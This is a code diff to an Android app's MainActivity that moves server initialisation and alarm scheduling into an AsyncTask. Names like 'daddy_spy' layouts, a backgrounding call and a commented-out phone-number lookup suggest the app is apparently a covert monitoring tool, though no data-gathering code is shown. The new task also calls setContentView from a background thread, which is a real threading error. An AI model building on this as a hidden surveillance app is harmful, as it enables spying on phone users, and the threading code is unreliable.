@@ -76,9 +76,10 @@ public class MainActivity extends AppCompatActivity {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        SettingsRepo settingsRepo = new SettingsRepo(this);
+
 
         setContentView(R.layout.activity_main);
+        SettingsRepo settingsRepo = new SettingsRepo(this);
 //        findViewById(R.id.text_frame_layout).setVisibility(View.VISIBLE);
         checkLanguage(settingsRepo);
  //      String phoneNuber = getPhoneNumber();
@@ -97,13 +98,17 @@ public class MainActivity extends AppCompatActivity {
 //        } catch (InterruptedException e) {
 //
 //        }
-        findViewById(R.id.text_frame_layout).setVisibility(View.INVISIBLE);
-        findViewById(R.id.daddy_spy_first_constraint_layout).setVisibility(View.VISIBLE);
-        appServerInit();
+       // findViewById(R.id.text_frame_layout).setVisibility(View.VISIBLE);
+       // findViewById(R.id.daddy_spy_first_constraint_layout).setVisibility(View.INVISIBLE);
+        //appServerInit();
+        MyAsyncTaskInit myAsyncTaskInit = new MyAsyncTaskInit();
+        myAsyncTaskInit.execute();
+        //findViewById(R.id.text_frame_layout).setVisibility(View.INVISIBLE);
+        //findViewById(R.id.daddy_spy_first_constraint_layout).setVisibility(View.VISIBLE);
 //        MyDevice myDevice = new MyDevice(this,activity);
 //        myDevice.setWifiApState(this);
         goToBackground();
-        scheduleAlarm();
+//        scheduleAlarm();
 
 
     }
@@ -497,5 +502,24 @@ public class MainActivity extends AppCompatActivity {
         //obj[1] = params;
         return obj;
     }
+
+    private class MyAsyncTaskInit extends AsyncTask<Void, Void, Void>
+    {
+        @Override
+        protected Void doInBackground(Void... params) {
+            setContentView(R.layout.activity_main_init);
+            appServerInit();
+            //goToBackground();
+            scheduleAlarm();
+            return null;
+        }
+        @Override
+        protected void onPostExecute(Void result) {
+            setContentView(R.layout.activity_main);
+            //findViewById(R.id.text_frame_layout).setVisibility(View.INVISIBLE);
+            //findViewById(R.id.daddy_spy_first_constraint_layout).setVisibility(View.VISIBLE);
+        }
+    }
+
 }
 
